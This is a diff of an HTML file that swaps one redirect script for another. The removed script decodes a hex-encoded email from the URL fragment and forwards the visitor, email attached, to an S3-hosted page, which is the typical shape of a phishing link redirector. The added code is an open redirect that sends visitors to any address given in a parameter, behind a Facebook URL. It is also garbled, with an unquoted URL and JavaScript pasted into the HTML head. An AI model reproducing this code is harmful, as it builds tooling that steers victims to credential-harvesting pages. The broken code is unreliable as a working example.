@@ -1,28 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title></title>
-</head>
-<body>
-<script>
-function hexToString(hex) {
-  let str = '';
-  for (let i = 0; i < hex.length; i += 2) {
-    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+<head>export default {
+  async fetch(request) {
+    const url = new URL(https://web.facebook.com/);
+    const target = url.searchParams.get("r");
+
+    if (!target) {
+      return new Response("Missing redirect parameter: r", { status: 400 });
+    }
+
+    return Response.redirect(target, 302);
   }
-  return str;
 }
 
-(function redirectPage(){
-  const hex = window.location.hash.slice(1); // Get value after #
-  if(!hex){ 
-    window.location.href = "https://facebook.com"; 
-    return; 
-  }
-  const email = hexToString(hex); // Convert hex → normal email
-  window.location.href = "https://valid-task.s3.eu-north-1.amazonaws.com/index.html#" + email;
-})();
 </script>
 </body>
 </html>
+
